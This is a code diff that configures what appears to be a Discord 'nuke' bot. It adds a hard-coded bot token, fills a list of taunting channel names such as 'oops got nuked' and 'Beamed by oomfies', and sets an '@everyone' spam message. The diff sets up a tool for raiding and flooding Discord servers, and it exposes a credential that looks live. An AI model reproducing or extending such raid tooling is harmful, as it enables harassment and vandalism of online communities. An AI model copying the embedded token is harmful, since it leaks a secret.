@@ -14,17 +14,17 @@ import requests
 
 import keep_alive
 
-token = "𝐁𝐨𝐭_𝐓𝐨𝐤𝐞𝐧"
+token = "MTUyMTc1MzAxNjk4OTEyMjU5MA.GXD8yb.T9rRvFz6Mu5pbV1COJFn7r4dyvfYEGho6T3sq0"
 
 #Check 'README.md' For Tutorial
 
 #Made by Karamveer enjoy!
 
-SPAM_CHANNEL =  ["𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞 runs you" , "Get ran" , "𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞" , "oops Beamed","𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞 Beamed You","Shoulda Listened","Get beamed clowns","Beamed by 𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞","oops got nuked","I run you","beamed by 𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞","I run you","kinda got beamed by 𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞"]
+SPAM_CHANNEL =  ["OOMFIES runs you" , "Get ran" , "GGS" , "oops Beamed","oomfi𝐞s Beamed You","Shoulda Listened","Get beamed clowns","Beamed by oomfies","oops got nuked","I run you","beamed by 𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞","I run you","kinda got beamed by 𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞"]
 
-SPAM_MESSAGE = ["@everyone 𝐒𝐩𝐚𝐦_𝐌𝐞𝐬𝐬𝐚𝐠𝐞"]
+SPAM_MESSAGE = ["@everyone GGS"]
 
-client = commands.Bot(command_prefix="𝐏𝐫𝐞𝐟𝐢𝐱_𝐀𝐫𝐞𝐚")
+client = commands.Bot(command_prefix="!")
 
 keep_alive.keep_alive() # For 24/7
 
